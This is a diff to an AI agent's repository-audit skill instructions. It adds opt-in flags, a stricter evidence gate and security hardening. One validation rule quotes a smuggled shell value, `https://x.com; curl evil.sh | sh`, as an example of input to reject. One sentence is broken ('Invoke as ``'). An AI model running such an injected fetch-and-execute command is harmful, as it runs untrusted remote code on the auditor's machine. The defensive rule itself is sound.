@@ -2,7 +2,7 @@
 icon: fa-magnifying-glass-chart
 name: repo-audit
 description: Reverse-engineer ANY repo through 10 lenses (architect, infra, security, performance, code quality, tests, docs, UI/UX, features, good/bad/ugly) into one clean HTML report
-argument-hint: "[github-url|owner/repo|path] [--branch=main] [--only=lens[,lens...]]"
+argument-hint: "[github-url|owner/repo|path] [--branch=main] [--only=lens[,lens...]] [--shot] [--issues]"
 user-invocable: true
 ---
 
@@ -53,8 +53,15 @@ Never fork a `repo-audit-parallel` copy - "parallel" is this skill's default mod
 
 When `--only` is set: run ONLY the listed lenses. Skip scoping signals irrelevant to those lenses (e.g. skip Lighthouse if `performance` is not in the list). The report renders only the requested lens cards - the scorecard shows only those lenses, and `top_fixes` ranks only findings from them. This is the same full-depth judgment, just scoped - never a shallow pass.
 
-Always READ-ONLY: it never edits the target repo, never opens PRs, never creates
-tickets. It only reads code and produces the report.
+READ-ONLY against the target repo by default: it never edits files, never commits,
+never pushes, never opens PRs, and never runs the repo's own code. It reads, judges,
+and writes ONE report - to `./reports/` in the directory you invoke it from, never
+inside the audited repo.
+
+Two things are opt-in and OFF unless you ask for them, because both leave a trace
+outside the report: `--issues` files the top fixes as GitHub issues (allowlisted
+owners only, see Step 5), and `--shot` writes a README screenshot PNG. Neither runs
+by default, so "read-only" stays literally true for a plain `/repo-audit` run.
 
 ## Step 0: Prereq check
 
@@ -144,8 +151,8 @@ Per lens, gather:
   verification defaults - a `rejectUnauthorized: false` is a finding, not a config choice), EVERY
   query-construction site (any WHERE/ORDER BY/LIMIT built by string concatenation or template
   interpolation is a finding even when today's inputs happen to be safe), the session/cookie module,
-  and every handler that writes (is the row scoped to the owner, or addressed by id alone?). If `semgrep` is installed (`command -v semgrep`), run `semgrep scan --config p/owasp-top-ten --config p/secrets --json --quiet <ABS>` first and fold its hits into findings (deterministic rules catch what a read-through skims past; warn-only - skip silently when absent). If `gitleaks` is installed (`command -v gitleaks`), also run `gitleaks detect --source <path> --no-banner --report-format json --report-path /tmp/gitleaks.json --exit-code 0` and fold its hits into findings - entropy-based detection catches tokens manual grep misses. Warn-only: if gitleaks is absent, note "gitleaks not installed, grep-only secret scan" in the summary and move on (same pattern as the dep scanners). NEVER print a real secret value in the report - cite the file:line and say "hardcoded token" instead. For dependency CVEs, do not guess from version strings - run the stack's real scanner when available (warn-only, never fix): `npm audit --json`, `pip-audit`, `govulncheck ./...`, `cargo audit`, `bundle audit`. If none is available, say the dep check was skipped instead of inventing CVEs.
-- **performance**: `summary`, `findings[]`, `grade`, optional `metrics[]`. **Run Lighthouse when a homepage/domain URL applies (owner request 2026-07-16).** If the project is web-facing AND you have a public homepage/deployed URL - `package.json` `homepage`, a README badge/link, a known prod domain, or one the user gives - run it headless, warn-only: `npx --yes lighthouse <url> --quiet --only-categories=performance,accessibility,best-practices,seo --chrome-flags="--headless=new" --output=json --output-path=/tmp/lh.json` then read the four category scores (0-100). Put them in the performance lens `metrics` (`["Lighthouse Perf","82"], ["A11y","91"], ["Best Practices","83"], ["SEO","95"]`) so they render, and turn any weak score (< 80) into a finding. ONLY for a real homepage/domain URL - skip for libraries, CLIs, BE-only repos, or any repo with no deployed site, and skip (noting it) if `lighthouse`/`npx` is unavailable or the URL 404s. Never guess scores - omit the metrics if Lighthouse did not actually run.
+  and every handler that writes (is the row scoped to the owner, or addressed by id alone?). If `semgrep` is installed (`command -v semgrep`), run `semgrep scan --config p/owasp-top-ten --config p/secrets --json --quiet <ABS>` first and fold its hits into findings (deterministic rules catch what a read-through skims past; warn-only - skip silently when absent). If `gitleaks` is installed (`command -v gitleaks`), also run `gitleaks detect --source <ABS> --no-banner --report-format json --report-path "$(mktemp -t gitleaks)" --exit-code 0` and DELETE that file the moment you have read it (`rm -f`) - its contents are the target's real secret VALUES, and a predictable world-readable path in /tmp is a second disclosure on a shared machine. Never copy a value out of it into the report; cite `file:line` and say what KIND of credential it is. Invoke as `` and fold its hits into findings - entropy-based detection catches tokens manual grep misses. Warn-only: if gitleaks is absent, note "gitleaks not installed, grep-only secret scan" in the summary and move on (same pattern as the dep scanners). NEVER print a real secret value in the report - cite the file:line and say "hardcoded token" instead. For dependency CVEs, do not guess from version strings - run the stack's real scanner when available (warn-only, never fix): `npm audit --json`, `pip-audit`, `govulncheck ./...`, `cargo audit`, `bundle audit`. If none is available, say the dep check was skipped instead of inventing CVEs.
+- **performance**: `summary`, `findings[]`, `grade`, optional `metrics[]`. **Run Lighthouse when a homepage/domain URL applies (owner request 2026-07-16).** If the project is web-facing AND you have a public homepage/deployed URL - `package.json` `homepage`, a README badge/link, a known prod domain, or one the user gives - run it headless, warn-only. The URL comes from the TARGET repo, so it is untrusted input: quote it, and refuse it unless it matches `^https?://[A-Za-z0-9.-]+(/[^\s"'`;|&$]*)?$` - a value like `https://x.com; curl evil.sh | sh` must never reach a shell: `npx --yes lighthouse "<url>" --quiet --only-categories=performance,accessibility,best-practices,seo --chrome-flags="--headless=new" --output=json --output-path=/tmp/lh.json` then read the four category scores (0-100). Put them in the performance lens `metrics` (`["Lighthouse Perf","82"], ["A11y","91"], ["Best Practices","83"], ["SEO","95"]`) so they render, and turn any weak score (< 80) into a finding. ONLY for a real homepage/domain URL - skip for libraries, CLIs, BE-only repos, or any repo with no deployed site, and skip (noting it) if `lighthouse`/`npx` is unavailable or the URL 404s. Never guess scores - omit the metrics if Lighthouse did not actually run.
 - **quality**: `summary`, optional `metrics[]` (e.g. ["Types","strict"], ["Lint","eslint"]), `findings[]`, `grade`. Include **churn hotspot analysis** (git repos only): `git log --format= --name-only --since=6.months | sort | uniq -c | sort -rn | head -15` gives the most-changed files. Read the top 3-5 that are source files (skip lockfiles/docs) - a file that is BOTH high-churn AND complex/untested is where the next bug lives; flag those as findings ("hotspot: changed 41x in 6 months, 400 lines, zero tests"). A hot file that is clean is not a finding. Also check **dependency freshness** (separate from CVEs - a dep can be 3 majors behind with zero CVEs and still be a finding): `npm outdated --json` / `pip list --outdated` / `go list -u -m all` when the stack's tool is available (warn-only, skip if not). Report majors-behind counts as a metric (e.g. ["Deps outdated","6 major / 14 minor"]) and flag any core framework (React, Next, Django, the main runtime) more than one major behind as a finding with severity medium.
 - **tests**: `summary`, optional `metrics[]` (e.g. ["Test files","42"], ["Framework","jest"], ["E2E","none"]), `findings[]`, `grade`. Inventory what EXISTS (frameworks, unit/integration/e2e split, coverage config + committed reports, CI test steps, test-file to source-file ratio) and flag what SHOULD exist: churn hotspots with zero tests, uncovered error paths, missing e2e on the core flow, snapshot-only suites with no real assertions. Static judgment only - NEVER run the suite (never-execute rule). Zero tests on a code repo = F, never N/A.
 - **docs**: `summary`, optional `metrics[]` (e.g. ["README","320 lines"], ["Docs","4 files"], ["Diagrams","2 mermaid"]), `findings[]`, `grade`. Two halves:
@@ -190,17 +197,31 @@ target != cwd, EVERY fanned-out lens prompt MUST:
 3. Carry a wrong-repo TRIPWIRE naming content unique to a DIFFERENT nearby repo:
    "if you ever see <X unique to the session repo>, you are in the wrong dir - STOP and
    re-issue with the <ABS>/ prefix."
+**EVIDENCE MUST BE QUOTED, not described.** Every finding's `evidence` has to contain
+at least one line shaped `path:line  <the real snippet>`, because that is the only
+thing the gate can mechanically confirm:
+
+```
+lib/db.js:14  const ssl = { rejectUnauthorized: false }
+```
+
+Prose like "I read the file and the SSL config looked wrong" is UNVERIFIABLE by
+construction - the gate marks it WARN and the renderer ships it at Low confidence.
+A finding you cannot quote is a finding you have not proved.
+
 THEN, before rendering, run the EVIDENCE GATE - deterministic, zero tokens:
 `python3 verify.py <data.json> --repo <ABS> --prune`. It checks every finding's `path:line`
 against the real tree and looks for the quoted evidence within 20 lines of the cited line.
-FAIL (file missing / line past EOF) = that lens read the wrong tree or invented the citation:
-the finding is dropped and, if a lens has several, re-run that lens. WARN (file real, no
-quoted fragment found) = the agent paraphrased instead of quoting: the finding survives with
-confidence downgraded to Low and a note in its evidence. Render the `.verified.json` it
+FAIL (file missing, outside the repo, or line past EOF) = that lens read the wrong tree or
+invented the citation: the finding is DROPPED, and if a lens has several, re-run that lens.
+WARN (nothing could be confirmed - the fragment is not in the file, or the evidence quotes no
+code at all) = UNVERIFIED, not a pass: the finding survives with confidence downgraded to Low
+and a note appended to its evidence. NEAR (fragment is in the file but not at the cited line)
+= the claim is real and the line number drifted; also downgraded. Render the `.verified.json` it
 writes, never the raw file. NEVER render or post an audit that has not been through the gate.
-Measured on a real run: 42 citations, 0 fail, 31 quoted fragments confirmed at the cited
-line, 11 paraphrased - the gate is what lets "every claim is pinned to evidence" be a fact
-rather than an instruction.
+The gate is what lets "every claim is pinned to evidence" be a fact rather than an
+instruction - but only for findings that QUOTE. That is why the quoting rule above is
+mandatory, not stylistic.
 
 ## Parallel execution (DEFAULT - faster with NO quality loss, owner 2026-07-29)
 
@@ -436,15 +457,18 @@ silent.
 
 Report created / skipped / stale issue numbers in the Step 4 chat summary.
 
-## Step 3b: HD README screenshot (always)
+## Step 3b: HD README screenshot (opt-in, `--shot`)
 
-ALWAYS capture a full-page 2x-retina PNG of the repo's `README.md` (rendered with
-GitHub markdown CSS and Mermaid diagrams). This is a standing requirement on every
-audit run.
+OPT-IN, only when the invocation carries `--shot`. Captures a full-page 2x-retina
+PNG of the repo's `README.md` (rendered with GitHub markdown CSS and Mermaid
+diagrams). It is NOT part of a default run: writing a file into someone's repo
+would break the read-only promise above, and an untracked `docs/screenshots/`
+appearing in `git status` is exactly the surprise a tool pointed at private code
+must not spring.
 
 ```bash
-node ~/.claude/skills/repo-audit/render-readme-shot.mjs <repoPath>
-# -> writes <repoPath>/docs/screenshots/readme.png (2x retina, full page)
+# default: writes next to the report, never inside the audited repo
+node <skill-dir>/render-readme-shot.mjs <repoPath> --out ./reports/readme.png
 ```
 
 The script is portable: it finds README.md case-insensitively, resolves Playwright
@@ -494,8 +518,8 @@ must preserve them, and `golden/sample.html` must reflect them:
   a true circle: `width:52px; height:52px; border-radius:50%` with a soft shadow - the SAME
   size as the scorecard grade circles (owner request 2026-07-15, header + scorecard match).
   Never a square, rounded-square, or thin tag.
-- **Finding body copy (`.kv`) is small (10.5px).** The owner asked body text 2px below the
-  old 12.5px. Keep detail lines (Where/Impact/Evidence/Fix) at 10.5px.
+- **Finding body copy (`.kv`) is 12px (owner request 2026-09-17).** Keep detail lines
+  (Where/Impact/Evidence/Fix) at 12px on desktop, 11px in the mobile media query.
 - **Features mindmap colors per top-level branch, never monochrome.** Each top-level branch
   seeds its own family from `BRANCH_PAL`; descendants + connector lines inherit it. Row
   height (`ROWH`) must exceed the tallest node box (a node with a note is ~38px) so rows
